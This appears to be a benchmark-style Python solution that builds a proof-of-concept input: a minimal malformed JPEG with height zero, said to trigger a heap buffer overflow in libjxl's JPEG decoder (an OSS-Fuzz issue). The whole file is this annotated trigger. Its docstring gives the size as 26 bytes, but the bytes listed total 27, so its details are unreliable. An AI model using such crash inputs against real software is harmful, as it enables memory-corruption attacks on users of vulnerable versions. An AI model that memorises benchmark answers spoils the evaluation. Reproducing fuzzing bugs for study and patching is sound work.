import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow
        in libjxl's JPEG decoder (oss-fuzz:42536679).

        The vulnerability is triggered by processing a JPEG image with a height
        or width of zero. The decoder fails to validate these dimensions,
        leading to a miscalculation of buffer sizes and a subsequent heap
        overflow.

        This PoC is a minimal, 26-byte JPEG file with its height set to 0 in
        the Start Of Frame (SOF0) marker. It contains only the essential JPEG
        markers required to reach the vulnerable code path:
        - SOI (Start of Image)
        - SOF0 (Start of Frame) with height=0
        - SOS (Start of Scan)
        - EOI (End of Image)
        """

        # This byte sequence represents a minimal JPEG with a height of 0.
        # It is based on the minimized test case from the OSS-Fuzz report.
        # Structure: SOI | SOF0 | SOS | EOI
        poc = (
            b'\xff\xd8'          # SOI Marker
            b'\xff\xc0'          # SOF0 Marker (Baseline DCT)
            b'\x00\x0b'          #   - Segment Length: 11
            b'\x08'              #   - Sample Precision: 8-bit
            b'\x00\x00'          #   - Image Height: 0 (The vulnerability trigger)
            b'\x00\x01'          #   - Image Width: 1
            b'\x01'              #   - Number of Components: 1
            b'\x01\x11\x00'      #   - Component 1 Spec (ID, Sampling, Quant. Table)
            b'\xff\xda'          # SOS Marker (Start of Scan)
            b'\x00\x08'          #   - Segment Length: 8
            b'\x01'              #   - Components in Scan: 1
            b'\x01\x00'          #   - Component 1 Selector (ID, Huffman Tables)
            b'\x00\x3f\x00'      #   - Spectral Selection & Approx.
            b'\xff\xd9'          # EOI Marker (End of Image)
        )
        return poc